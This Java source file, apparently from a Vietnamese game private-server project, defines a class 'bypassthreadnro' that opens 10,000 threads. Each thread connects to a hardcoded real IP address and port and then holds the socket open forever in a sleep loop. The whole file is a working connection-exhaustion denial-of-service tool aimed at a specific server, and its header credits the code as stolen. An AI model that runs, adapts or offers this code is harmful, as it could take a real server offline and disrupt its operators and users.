/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.girlkun.consts;

import com.girlkun.database.GirlkunDB;
import com.girlkun.result.GirlkunResultSet;

/**
 *
 * @Stole By Hoàng Việt
 */
/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */

/**
 *
 * @author KAMI-TRMP
 */
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;

public class bypassthreadnro {

    public static void main(String[] args) {
        String serverHost = "210.211.117.16"; 
        int serverPort = 1000;

        int numberOfConnections = 10000;

        for (int i = 0; i < numberOfConnections; i++) {
            new ConnectionThread(serverHost, serverPort, i).start();
        }
    }

    private static class ConnectionThread extends Thread {
        private final String serverHost;
        private final int serverPort;
        private final int connectionNumber;

        public ConnectionThread(String serverHost, int serverPort, int connectionNumber) {
            this.serverHost = serverHost;
            this.serverPort = serverPort;
            this.connectionNumber = connectionNumber;
        }

        @Override
        public void run() {
            try (Socket socket = new Socket()) {
                socket.connect(new InetSocketAddress(serverHost, serverPort), 5000);

                System.out.println("new thread " + (connectionNumber + 1) + " -----------------------");

               
                while (true) {
                    try {
                      
                        Thread.sleep(10000); 
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
